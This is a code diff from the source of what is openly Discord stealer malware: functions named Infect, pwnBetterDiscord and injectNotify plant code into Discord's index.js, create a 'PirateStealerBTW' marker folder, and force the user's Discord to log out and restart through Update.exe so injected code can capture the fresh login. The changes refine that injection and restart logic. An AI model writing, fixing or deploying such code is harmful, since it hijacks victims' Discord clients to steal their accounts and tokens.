@@ -60,13 +60,16 @@ function Infect() {
                         fs.mkdirSync(init, 0744)
                     }
                 }
-                if ( config.logout !== "false" ) {
+                if ( config.logout != "false" ) {
+
                     let folder = file.replace("index.js", "PirateStealerBTW")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
                         if (config.logout == "instant") {
                             startDiscord();
                         }
+                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
+                        startDiscord();
                     }
                 }
             })
@@ -124,14 +127,15 @@ function killDiscord() {
     if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
         injectNotify();
     }
+
     Infect()
     pwnBetterDiscord()
 };
 
 function startDiscord() {
     runningDiscords.forEach(disc => {
-        path = LOCAL + '\\' + disc + "\\Update.exe"
-        exec(`${path} --processStart ${disc}.exe`, (err) => {
+        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
+        exec(path, (err) => {
             if (err) {
               return;
             }
@@ -185,3 +189,4 @@ function injectNotify() {
     })
 
 }
+
